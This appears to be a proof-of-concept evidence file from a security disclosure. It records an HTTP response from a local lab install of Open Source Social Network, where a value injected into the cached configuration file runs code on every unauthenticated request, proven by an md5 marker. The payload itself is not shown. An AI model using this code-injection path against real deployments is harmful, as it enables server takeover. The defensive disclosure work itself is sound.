@@ -1,0 +1,28 @@
+## e03: The injected value executes at bootstrap on EVERY request (config included by system/start.php:34)
+## Request: GET /index.php  (no cookies, unauthenticated)
+
+### Response headers:
+HTTP/1.1 200 OK
+Host: 127.0.0.1:8093
+Date: Mon, 28 Sep 2026 18:13:58 GMT
+Connection: close
+X-Powered-By: PHP/8.4.26
+Set-Cookie: PHPSESSID=<REDACTED> (32-hex, destroyed local lab session); path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+
+
+### First 300 bytes of response body (md5(0) marker printed by the interpolated payload):
+cfcd208495d565ef66e7dff9f98764da<br />
+<b>Warning</b>:  Undefined variable $1 in <b><LAB_ROOT>repos\opensource-socialnetwork\configurations\ossn.config.dcache.php</b> on line <b>15</b><br />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="
+
+### Expected marker from md5("0"):
+cfcd208495d565ef66e7dff9f98764da
+### Marker found in response body:
+1
